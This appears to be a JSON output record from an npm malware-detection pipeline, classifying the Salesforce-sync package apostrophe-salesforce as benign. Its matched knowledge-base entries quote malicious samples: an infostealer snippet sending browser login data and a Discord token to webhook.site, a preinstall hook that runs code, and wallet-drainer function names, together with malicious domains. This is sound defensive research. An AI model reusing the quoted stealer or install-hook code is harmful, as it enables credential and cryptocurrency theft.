@@ -1,0 +1,466 @@
+{
+  "package_name": "apostrophe-salesforce",
+  "package_version": "0.1.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:52:56.142826",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-salesforce/0.1.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-salesforce/0.1.2/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var _       = require('lodash'),\n    async   = require('async'),\n    flatten = require('flat'),\n    moment  = require('moment'),\n    jsforce = require('jsforce');\n\nmodule.exports = salesforce;\n\nfunction salesforce (options, callback) {\n  return new Construct(options, callback);\n}\n\nfunction Construct (options, callback) {\n  var self = this;\n\n  var connection;\n\n  // Add a bunch of methods to self here\n  self._app = options.app;\n  self._apos = options.apos;\n  self._site = options.site;\n  self.progress = self._apos.getCache('apostrophe-salesforce-progress');\n\n  // The configuration of how Salesforce data maps into Apostrophe\n  self.mappings = options.mappings;\n\n  self._apos.db.collection('aposSalesforce', function (err, collection) {\n    collection.findOne({}, {sort: [['$natural','desc']]}, function(err, doc) {\n      if (!doc) return\n      self.lastRun = doc.lastRun;\n    });\n  });\n\n  self._app.get(\"/apos/salesforce/sync\", function(req, res) {\n    req.jobId = self._apos.generateId();\n    return self.progress.set(req.jobId, { finished: false, error: false }, function(err) {\n      res.redirect('/apos/salesforce/progress?jobId=' + req.jobId);\n      // Deliberately continuing after res.redirect\n      if (!err) {\n        self.sync(req, req.query, function(err) {\n          if (err) {\n            self.progress.set(req.jobId, { finished: true, error: true }, function() {});\n          } else {\n            self.progress.set(req.jobId, { finished: true, error: false }, function() {});\n          }\n        });\n      }\n    });\n  });\n\n  self._app.get(\"/apos/salesforce/progress\", function(req, res) {\n    var jobId = req.query.jobId;\n    return self.progress.get(jobId, function(err, obj) {\n      if (err || (!obj)) {\n        return respond({ error: true });\n      } else {\n        return respond(obj);\n      }\n    });\n    function respond(obj) {\n      return res.send(self.renderPage(req, 'progress', obj));\n    }\n  });\n\n  // Salesforce authentication stuffs\n  self.getUsername = function(options, callback) {\n    callback(options.sfUsername);\n  }\n\n  self.getPassword = function(options, callback) {\n    callback(options.sfPassword);\n  }\n\n  self.getSecurityToken = function(options, callback) {\n    callback(options.sfSecurityToken);\n  }\n\n  // If options.resync is true, re-syncs everything, not just things modified\n  // since the last run. Useful if the mappings have changed\n  self.sync = function(req, options, callback) {\n    if (!callback) {\n      callback = options;\n      options = {};\n    }\n    var startTime = moment().format();\n\n    getConnection(function(err) {\n      if (err) return console.log(err);\n\n      var queries = [];\n\n      // Create each query object\n      self.mappings.forEach(function(mapping) {\n        mapping.Type = self._site.modules[mapping.aposObj];\n        mapping.req = req; // getOne and putOne requires req object\n        var lastRun;\n        if (options.resync) {\n          lastRun = undefined;\n        } else {\n          lastRun = self.lastRun;\n        }\n        queries.push(new Query(mapping, lastRun));\n      });\n      return async.series({\n          execute: function (callback) {\n            return async.parallel(_.pluck(queries, 'execute'), callback);\n          },\n          map: function (callback) {\n            return async.parallel(_.pluck(queries, 'map'), callback);\n          },\n          save: function (callback) {\n            return async.parallel(_.pluck(queries, 'save'), callback);\n          },\n          join: function (callback) {\n            return async.parallel(_.pluck(queries, 'join'), callback);\n          }\n        }, \n        function(err) {\n          if (err) {\n            return callback(err);\n          }\n          self.lastRun = startTime;\n          console.log(\"Finished sync, logging last run\");\n          self._apos.db.collection('aposSalesforce', function (err, collection) {\n            collection.insert({lastRun: self.lastRun, finished: new Date()}, function(err, result) {\n              // Failure to insert lastRun is not an error\n              return callback(null);\n            });\n          });\n        }\n      );\n    })\n  }\n\n  function getConnection (callback) {\n    connection = null;\n    async.series({\n      getUsername: function(callback) {\n        self.getUsername(options, function(username) {\n          self.sfUsername = username;\n          callback();\n        });\n      },\n      getPassword: function(callback) {\n        self.getPassword(options, function(password) {\n          self.sfPassword = password;\n          callback();\n        });\n      },\n      getSecurityToken: function(callback) {\n        // Append security token to password, as Salesforce requires\n        self.getSecurityToken(options, function(token) {\n          self.sfPassword += token || \"\";\n          callback();\n        });\n      }\n    }, function() {\n      connection = new jsforce.Connection({});\n      connection.login(self.sfUsername, self.sfPassword, function(err, userInfo) {\n        return callback(err, connection);\n      });\n    }); \n  }\n\n  var Query = function (mapping, lastRun) {\n    var self = this;\n\n    var Type = mapping.Type;\n    var req = mapping.req;\n\n    var MAX_RESULTS = 20000;\n\n    // Construct the SOQL Query\n    var queryFields = [];\n    var whereClauses = [];\n    // Add delta logic\n    if (lastRun) {\n      whereClauses.push(\"LastModifiedDate > \" + lastRun);\n    }\n    // Add fields to SELECT\n    for(var aposField in mapping.fields) {\n      var sfFields = mapping.fields[aposField];\n      if(!(sfFields instanceof Array)) {\n        sfFields = [sfFields];\n      }\n      queryFields.push.apply(queryFields, sfFields);\n      // Add required fields\n      if(mapping.required && mapping.required.indexOf(aposField) >= 0) {\n        sfFields.forEach(function(sfField) {\n          whereClauses.push(sfField + \" != null\")\n        });\n      }\n    }\n    // Add nested queries for JOINs\n    for(var aposJoin in mapping.joins) {\n      var join = mapping.joins[aposJoin];\n      if (join.hasMany) {\n        queryFields.push('(SELECT Entity.Id FROM ' + join.sfType + ' AS Entity)');\n      } else {\n        queryFields.push(join.sfType + '.Id');\n      }\n    }\n    // Add custom WHERE clauses\n    if (mapping.where) {\n      whereClauses.push.apply(whereClauses, mapping.where)\n    }\n    // Create query string\n    self.queryString = \"SELECT Id, \" + queryFields.join(', ') + \n                      \" FROM \" + mapping.sfObj + \n                      ((whereClauses.length > 0) ? \" WHERE \" + whereClauses.join(\" AND \") : \"\") + \n                      \" LIMIT \" + MAX_RESULTS;\n\n    self.sfResults = [];\n    self.aposResults = [];\n\n    // Executes the constructed query\n    self.execute = function(callback) {\n      connection.query(self.queryString)\n        .on(\"record\", function(sfObj) {\n          sfObj = flatten(sfObj, {safe: true});\n          self.sfResults.push(sfObj);\n        })\n        .on(\"end\", function(query) {\n          callback();\n        })\n        .on(\"error\", function(err) {\n          callback(err);\n        })\n        .run({autoFetch: true, maxFetch: MAX_RESULTS});\n    }\n\n    // Maps the salesforce results to apostrophe objects\n    self.map = function(callback) {\n      self.sfResults.forEach(function(sfObj) {\n        // Create new instance of object and associate with Salesforce id\n        var aposObj = {};\n        aposObj.sfId = sfObj.Id;\n        // Add fields to Apostrophe object according to mapping configuration\n        for(var aposField in mapping.fields) {\n          var sfFields = mapping.fields[aposField];\n          if(!(sfFields instanceof Array)) {\n            sfFields = [sfFields];\n          }\n          var sfFieldValues = [];\n          sfFields.forEach(function(sfField) {\n            var sfValue = sfObj[sfField];\n            if(typeof sfValue !== 'undefined' && sfValue !== null) {\n              sfFieldValues.push(sfValue);\n            }\n          });\n          // Concatenate selected fields and add them to Apostrophe object\n          if(sfFieldValues.length > 0) {\n            aposObj[aposField] = sfFieldValues.join(' ');\n          }\n        }\n        for(var aposArray in mapping.arrays) {\n          var sfFields = mapping.arrays[aposArray];\n          if(!(sfFields instanceof Array)) {\n            sfFields = [sfFields];\n          }\n          var sfFieldValues = [];\n          sfFields.forEach(function(sfField) {\n            var sfValue = sfObj[sfField];\n            if(typeof sfValue !== 'undefined' && sfValue !== null) {\n              sfFieldValues.push(sfValue);\n            }\n          });\n          if(sfFieldValues.length > 0) {\n            aposObj[aposArray] = sfFieldValues;\n          }\n        }\n        self.aposResults.push(aposObj);\n      });\n      callback();\n    }\n\n    // De-dups and saves the apostrophe objects\n    self.save = function(callback) {\n      // De-duping step\n      // A reasonable amount of parallelism only, so we don't kill the site while\n      // this is going on. -Tom\n      async.eachLimit(self.aposResults, 3,\n        function(aposObj, callback) {\n          Type.getOne(req, {sfId: aposObj.sfId}, {}, function(err, item) {\n            if(err) return callback(err);\n\n            if(!item) {\n              item = Type.newInstance();\n            }\n            item = _.extend(item, aposObj);\n            // Save the Apostrophe object\n            Type.putOne(req, {}, item, function(err) {\n              if (err) console.log(err);\n              callback(err);\n            });\n          });\n        }, function(err) {\n          callback(err);\n        }\n      );\n    }\n\n    // Creates joins in the saved apostrophe objects\n    self.join = function(callback) {\n      if (!mapping.joins || mapping.joins.length <= 0) {\n        return callback();\n      }\n      // A reasonable amount of parallelism only, so we don't kill the site while\n      // this is going on. -Tom\n      return async.eachLimit(self.sfResults, 3,\n        function(sfObj, callback) {\n          Type.getOne(req, {sfId: sfObj.Id}, {}, function(err, aposObj) {\n            if(!aposObj) return callback();\n            for(var aposJoin in mapping.joins) {\n              var join = mapping.joins[aposJoin];\n              if (join.hasMany) {\n                var joinResults = sfObj[join.sfType + '.records'];\n                if (!joinResults) return callback(err);\n                // We're parallel enough at this point\n                return async.eachSeries(joinResults, \n                  function(joinResult, callback) {\n                  options.site.modules[join.aposType].getOne(req, {sfId: joinResult.Id}, {}, function(err, item) {\n                    if(!item) return callback(err);\n                    if(!aposObj[aposJoin]) {\n                      aposObj[aposJoin] = [];\n                    }\n                    if (!_.contains(aposObj[aposJoin], item._id)) {\n                      aposObj[aposJoin].push(item._id);\n                    }\n                    return callback(err);\n                  });\n                },\n                function(err) {\n                  Type.putOne(req, { version: false }, aposObj, function(err) {\n                    return callback(err);\n                  });\n                });\n              } else {\n                var sfObjId = sfObj[join.sfType + \".Id\"];\n                options.site.modules[join.aposType].getOne(req, {sfId: sfObjId}, {}, function(err, item) {\n                  if(!item) return callback(err);\n                  aposObj[aposJoin] = item._id;\n                  Type.putOne(req, { version: false }, aposObj, function(err) {\n                    return callback(err);\n                  });\n                });\n              }\n            }\n          });\n        }, function(err) {\n          return callback(err);\n        }\n      );\n    }\n  }\n\n  // Add admin UI elements\n  self._apos.mixinModuleAssets(self, 'salesforce', __dirname, options);\n  self._apos.addLocal('aposSalesforceMenu', function(args) {\n    var result = self.render('menu', args);\n    return result;\n  });\n\n  self._apos.on('tasks:register', function(taskGroups) {\n    taskGroups.apostrophe.salesforceSync = function(apos, argv, callback) {\n      return self.sync(self._apos.getTaskReq(), {\n        resync: argv.resync\n      }, callback);\n    };\n  });\n  \n  // Ensure index on Salesforce id in Apostrophe\n  self._apos.pages.ensureIndex({ sfId: 1 }, { safe: true }, function() {\n    // Invoke the callback. This must happen on next tick or later!\n    if (callback) {\n      return process.nextTick(function() {\n        return callback(null);\n      });\n    }\n  });\n  \n}\n\n// Export the constructor so others can subclass\nsalesforce.Construct = Construct;",
+          "is_malicious": false,
+          "malice_score": 0.4022008001804352,
+          "confidence": 0.1,
+          "behavior_summary": "When called via HTTP GET on /apos/salesforce/sync, the code accesses Salesforce credentials (username, password, security token) from options, authenticates using the jsforce library, constructs and executes SOQL queries to retrieve Salesforce data, then maps and saves this data into ApostropheCMS database collections. It performs network operations via jsforce.Connection.login and query APIs, accesses and modifies database collections, and manages asynchronous processing of data synchronization. This behavior enables automated synchronization of Salesforce data into the local CMS, potentially exposing sensitive Salesforce credentials and data if misused or compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate integration module designed to synchronize Salesforce data into ApostropheCMS. It uses the jsforce library to authenticate with Salesforce using credentials provided via options, constructs SOQL queries, retrieves data, maps it, and saves it into the CMS database. While it handles sensitive credentials (username, password, security token), it does not hardcode them, nor does it exfiltrate data outside the intended synchronization process. The code lacks obfuscation, does not execute arbitrary code outside its scope, and does not perform any suspicious system manipulation or unauthorized network communication beyond Salesforce API calls. Compared to the known malicious patterns, it does not exhibit key indicators such as hardcoded secrets (Example 1), preinstall arbitrary code execution (Example 2), or crypto wallet manipulation (Example 3). The presence of sensitive API usage here is consistent with its legitimate purpose, not malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104227_879951_snippet_3",
+              "source_package": "N/A (General Analysis of Secrets Exposure in Open Source Repositories) (npm, PyPI, RubyGems, Nuget)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104227_879951/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4559142589569092,
+              "code_similarity": 0.38891279697418213,
+              "behavior_similarity": 0.5229157209396362,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "SALESFORCE_SECRET = '00Dxx0000001gPFEAY!AQwAQ...'; # Salesforce OAuth secret",
+                "code_behavior": "At import-time, the code assigns a hardcoded Salesforce OAuth secret to a variable, exposing the secret to anyone with code access and enabling attackers to impersonate users or access Salesforce APIs.",
+                "malice_analysis": {
+                  "why_suspicious": "OAuth secrets are highly sensitive credentials that, if exposed, can allow attackers to impersonate users or gain unauthorized access to enterprise SaaS platforms.",
+                  "violated_expectations": "OAuth secrets should always be stored in secure vaults or injected at runtime, never hardcoded in source code or configuration files.",
+                  "similar_legitimate_use": "There is no legitimate use case for hardcoding OAuth secrets; they must always be protected.",
+                  "key_indicators": [
+                    "Strings matching OAuth secret patterns (e.g., Salesforce secret formats)",
+                    "Secrets for enterprise SaaS platforms present in code",
+                    "Assignment of secrets to variables in configuration or authentication files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "application source code (e.g., config.rb, .env, etc.)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (General Analysis of Secrets Exposure in Open Source Repositories)",
+                  "package_manager": "npm, PyPI, RubyGems, Nuget",
+                  "package_versions": "Multiple/Varied (as per detected leaks)",
+                  "why_malicious": "Packages are considered malicious or high-risk when they contain hardcoded secrets (API keys, tokens, credentials) that can be abused by attackers to gain unauthorized access to sensitive services and data. The presence of such secrets in public or open source repositories exposes organizations to credential theft, privilege escalation, and supply chain attacks. This risk is heightened when secrets are committed to version control, making them accessible to a wide audience and susceptible to automated scanning by threat actors."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Sensitive secrets (API keys, tokens, credentials) are hardcoded into source code and committed to public or private repositories.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Secrets become discoverable by anyone with repository access, including attackers."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attackers use automated tools to scan repositories for exposed secrets, identifying valid credentials for cloud, messaging, or SaaS services.",
+                    "implemented_by": [],
+                    "leads_to": "Attackers obtain valid credentials for cloud, messaging, or SaaS services."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attackers leverage the stolen secrets to access, abuse, or exfiltrate data from the associated services, potentially escalating privileges or moving laterally.",
+                    "implemented_by": [],
+                    "leads_to": "Potential data breaches, account takeover, or further supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of high-entropy strings matching known API key or token formats (e.g., Google API keys, Discord tokens, Salesforce secrets) in source code",
+                    "Secrets for cloud or SaaS services committed to version control repositories",
+                    "Rapid or anomalous access to cloud/SaaS APIs using newly exposed credentials from untrusted or foreign IP addresses"
+                  ],
+                  "file_indicators": [
+                    ".env files containing secrets committed to repositories",
+                    "Configuration files (e.g., config.js, settings.py, config.rb) with hardcoded credentials",
+                    "Secrets present in test, sample, or example files that are not clearly marked as non-production",
+                    "Variables or constants in code assigned high-entropy strings matching credential patterns"
+                  ],
+                  "network_indicators": [
+                    "Unusual or unauthorized access attempts to cloud/SaaS APIs using exposed credentials",
+                    "API requests originating from IP addresses not associated with the organization, especially shortly after a commit containing secrets",
+                    "Sudden spikes in failed authentication attempts or usage anomalies for affected services"
+                  ],
+                  "how_to_detect": "Deploy automated secrets scanning tools (e.g., truffleHog, git-secrets, Gitleaks) to identify high-entropy strings and known credential patterns in code repositories. Monitor for commits that introduce secrets, and set up alerts for any use of credentials from untrusted or foreign sources. Implement canary tokens to detect unauthorized use, and regularly audit code and configuration files for accidental exposures. Integrate detection with CI/CD pipelines to prevent secrets from being committed."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202036_301570_snippet_1",
+              "source_package": "chart-tablejs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202036_301570/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.37751108407974243,
+              "code_similarity": 0.33489882946014404,
+              "behavior_similarity": 0.4201233386993408,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"preinstall\": \"npm install sync-request && node main.js\"",
+                "code_behavior": "During preinstall, the script installs the sync-request dependency and immediately executes main.js, enabling the execution of arbitrary code and network operations before the package is fully installed.",
+                "malice_analysis": {
+                  "why_suspicious": "Executing arbitrary code and installing additional dependencies during the preinstall phase is highly unusual and can be leveraged to execute malicious payloads before the user is aware or able to intervene.",
+                  "violated_expectations": "Legitimate npm packages do not install new dependencies or execute arbitrary scripts in preinstall; this phase is typically reserved for environment checks or setup, not for fetching and running code.",
+                  "similar_legitimate_use": "Some legitimate packages use preinstall for environment validation or setup, but not for installing new dependencies or running main payloads.",
+                  "key_indicators": [
+                    "preinstall script executes arbitrary code",
+                    "installs sync-request (not a standard production dependency)",
+                    "immediately runs main.js"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (scripts.preinstall)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "chart-tablejs",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.1",
+                  "why_malicious": "The package 'chart-tablejs' is part of a coordinated supply-chain attack that requires the sequential installation of two paired npm packages. Upon installation, it executes code at preinstall time to fetch a token from a remote server and stores it in a hidden directory within the user's home folder, priming the system for a second-stage payload. The code disables TLS certificate verification, downloads and executes remote code, and is designed to evade detection by splitting the attack across multiple packages and using inconsistent naming conventions. This behavior enables remote code execution and persistence, and facilitates the delivery of further malicious payloads."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script installs sync-request and executes main.js to fetch a token from a remote server and store it in a hidden directory.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Token is stored locally for use by the second package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Second package's preinstall script reads the token, sends it to a remote server, writes the server's response as a JavaScript file, and executes it.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Remote JavaScript payload is executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Executed JavaScript fetches a Base64-encoded binary payload from another remote server, decodes it, writes it to disk, sets permissions, and executes it if valid.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Final payload is executed on the victim's machine."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall scripts that install dependencies and execute arbitrary code",
+                    "Disabling TLS certificate validation via NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Creation of hidden directories in user home (e.g., ~/.cprice, ~/.vscode, ~/.config)",
+                    "Fetching remote tokens and chaining execution across multiple packages",
+                    "Writing and executing files fetched from remote servers",
+                    "Base64-decoding and execution of downloaded payloads"
+                  ],
+                  "file_indicators": [
+                    "Presence of hidden directories: ~/.cprice, ~/.vscode, ~/.config, ~/.npm, ~/.audit",
+                    "Token files: pricetoken, jsontoken, audit-cache, npmcache",
+                    "Downloaded payloads: pricecheck.js, price.dat, etc.",
+                    "package.json scripts.preinstall with suspicious commands"
+                  ],
+                  "network_indicators": [
+                    "Connections to domains: tradingprice.net, bi2price.com, npmrepos.com, npmcloudjs.com, npmjsregister.com",
+                    "Endpoints: /checktoken.php, /getbprice.php, /getfullhistory.php, /checkupdate.php, /getupdate.php, /auditcheck.php, /getcheckjs.php",
+                    "POST requests with local tokens, GET requests with token and OS info"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with preinstall scripts that install dependencies and execute arbitrary files. Flag any code that disables TLS certificate validation or creates hidden directories in the user's home directory. Detect network requests to known malicious domains and endpoints, especially those involving token exchange and dynamic code fetching. Look for Base64-decoded payloads being written and executed from hidden directories. Correlate installations of known paired packages within a short time window on the same system to identify coordinated supply-chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3754805326461792,
+              "code_similarity": 0.35332322120666504,
+              "behavior_similarity": 0.39763787388801575,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3723891079425812,
+              "code_similarity": 0.32498276233673096,
+              "behavior_similarity": 0.4197954535484314,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
